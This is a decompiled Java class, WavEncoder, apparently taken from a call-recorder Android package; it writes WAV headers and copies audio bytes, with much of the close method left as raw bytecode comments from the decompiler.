package com.krecorder.encoder;

import com.vvt.ak.a;
import java.io.File;
import java.io.FileOutputStream;

public class WavEncoder
  extends AudioEncoderBase
{
  private static final boolean LOGE = a.e;
  private static final String TAG = "WavEncoder";
  private File file;
  private FileOutputStream fos;
  private int totalBytesWritten;
  
  public WavEncoder(FileOutputStream paramFileOutputStream, File paramFile)
  {
    this.fos = paramFileOutputStream;
    this.file = paramFile;
    this.totalBytesWritten = 0;
  }
  
  /* Error */
  public void close()
  {
    // Byte code:
    //   0: aconst_null
    //   1: astore_1
    //   2: iconst_1
    //   3: istore_2
    //   4: new 38	com/krecorder/call/callrecorder/v
    //   7: astore_3
    //   8: sipush 8000
    //   11: istore 4
    //   13: bipush 16
    //   15: istore 5
    //   17: aload_0
    //   18: getfield 35	com/krecorder/encoder/WavEncoder:totalBytesWritten	I
    //   21: istore 6
    //   23: aload_3
    //   24: iload_2
    //   25: iload_2
    //   26: iload 4
    //   28: iload 5
    //   30: iload 6
    //   32: invokespecial 43	com/krecorder/call/callrecorder/v:<init>	(SSISI)V
    //   35: aload_0
    //   36: getfield 31	com/krecorder/encoder/WavEncoder:fos	Ljava/io/FileOutputStream;
    //   39: astore 7
    //   41: aload 7
    //   43: invokevirtual 48	java/io/FileOutputStream:close	()V
    //   46: iconst_0
    //   47: istore_2
    //   48: aconst_null
    //   49: astore 7
    //   51: aload_0
    //   52: aconst_null
    //   53: putfield 31	com/krecorder/encoder/WavEncoder:fos	Ljava/io/FileOutputStream;
    //   56: new 50	java/io/RandomAccessFile
    //   59: astore 7
    //   61: aload_0
    //   62: getfield 33	com/krecorder/encoder/WavEncoder:file	Ljava/io/File;
    //   65: astore 8
    //   67: ldc 52
    //   69: astore 9
    //   71: aload 7
    //   73: aload 8
    //   75: aload 9
    //   77: invokespecial 55	java/io/RandomAccessFile:<init>	(Ljava/io/File;Ljava/lang/String;)V
    //   80: lconst_0
    //   81: lstore 10
    //   83: aload 7
    //   85: lload 10
    //   87: invokevirtual 59	java/io/RandomAccessFile:seek	(J)V
    //   90: aload_3
    //   91: aload 7
    //   93: invokevirtual 63	com/krecorder/call/callrecorder/v:a	(Ljava/io/RandomAccessFile;)V
    //   96: aload 7
    //   98: ifnull +8 -> 106
    //   101: aload 7
    //   103: invokevirtual 64	java/io/RandomAccessFile:close	()V
    //   106: return
    //   107: astore_3
    //   108: iconst_0
    //   109: istore 12
    //   111: aconst_null
    //   112: astore_3
    //   113: getstatic 25	com/krecorder/encoder/WavEncoder:LOGE	Z
    //   116: istore_2
    //   117: iload_2
    //   118: ifeq +3 -> 121
    //   121: aload_3
    //   122: ifnull -16 -> 106
    //   125: aload_3
    //   126: invokevirtual 64	java/io/RandomAccessFile:close	()V
    //   129: goto -23 -> 106
    //   132: astore_3
    //   133: getstatic 25	com/krecorder/encoder/WavEncoder:LOGE	Z
    //   136: istore 12
    //   138: iload 12
    //   140: ifeq -34 -> 106
    //   143: goto -37 -> 106
    //   146: astore_3
    //   147: aload_1
    //   148: ifnull +7 -> 155
    //   151: aload_1
    //   152: invokevirtual 64	java/io/RandomAccessFile:close	()V
    //   155: aload_3
    //   156: athrow
    //   157: astore 7
    //   159: getstatic 25	com/krecorder/encoder/WavEncoder:LOGE	Z
    //   162: istore_2
    //   163: iload_2
    //   164: ifeq -9 -> 155
    //   167: goto -12 -> 155
    //   170: astore_3
    //   171: getstatic 25	com/krecorder/encoder/WavEncoder:LOGE	Z
    //   174: istore 12
    //   176: iload 12
    //   178: ifeq -72 -> 106
    //   181: goto -75 -> 106
    //   184: astore_3
    //   185: aload 7
    //   187: astore_1
    //   188: goto -41 -> 147
    //   191: astore 7
    //   193: aload_3
    //   194: astore_1
    //   195: aload 7
    //   197: astore_3
    //   198: goto -51 -> 147
    //   201: astore_3
    //   202: aload 7
    //   204: astore_3
    //   205: goto -92 -> 113
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	208	0	this	WavEncoder
    //   1	194	1	localObject1	Object
    //   3	45	2	s1	short
    //   116	48	2	bool1	boolean
    //   7	84	3	localv	com.krecorder.call.callrecorder.v
    //   107	1	3	localException1	Exception
    //   112	14	3	localObject2	Object
    //   132	1	3	localIOException1	java.io.IOException
    //   146	10	3	localObject3	Object
    //   170	1	3	localIOException2	java.io.IOException
    //   184	10	3	localObject4	Object
    //   197	1	3	localObject5	Object
    //   201	1	3	localException2	Exception
    //   204	1	3	localObject6	Object
    //   11	16	4	i	int
    //   15	14	5	s2	short
    //   21	10	6	j	int
    //   39	63	7	localObject7	Object
    //   157	29	7	localIOException3	java.io.IOException
    //   191	12	7	localObject8	Object
    //   65	9	8	localFile	File
    //   69	7	9	str	String
    //   81	5	10	l	long
    //   109	68	12	bool2	boolean
    // Exception table:
    //   from	to	target	type
    //   35	39	107	java/lang/Exception
    //   41	46	107	java/lang/Exception
    //   52	56	107	java/lang/Exception
    //   56	59	107	java/lang/Exception
    //   61	65	107	java/lang/Exception
    //   75	80	107	java/lang/Exception
    //   125	129	132	java/io/IOException
    //   35	39	146	finally
    //   41	46	146	finally
    //   52	56	146	finally
    //   56	59	146	finally
    //   61	65	146	finally
    //   75	80	146	finally
    //   151	155	157	java/io/IOException
    //   101	106	170	java/io/IOException
    //   85	90	184	finally
    //   91	96	184	finally
    //   113	116	191	finally
    //   85	90	201	java/lang/Exception
    //   91	96	201	java/lang/Exception
  }
  
  public int encode(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)
  {
    int i = paramArrayOfByte2.length;
    int j = paramArrayOfByte1.length;
    if (i < j)
    {
      Exception localException = new java/lang/Exception;
      localException.<init>("Output buffer is smaller than the input buffer");
      throw localException;
    }
    i = paramArrayOfByte1.length;
    System.arraycopy(paramArrayOfByte1, 0, paramArrayOfByte2, 0, i);
    i = this.totalBytesWritten;
    j = paramArrayOfByte1.length;
    i += j;
    this.totalBytesWritten = i;
    return paramArrayOfByte1.length;
  }
  
  public void init()
  {
    int i = 44;
    Object localObject = this.fos;
    if (localObject != null)
    {
      localObject = this.file;
      if (localObject != null) {}
    }
    else
    {
      localObject = new java/lang/Exception;
      ((Exception)localObject).<init>("No outputstream /file specified");
      throw ((Throwable)localObject);
    }
    localObject = new byte[i];
    this.fos.write((byte[])localObject, 0, i);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/krecorder/encoder/WavEncoder.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */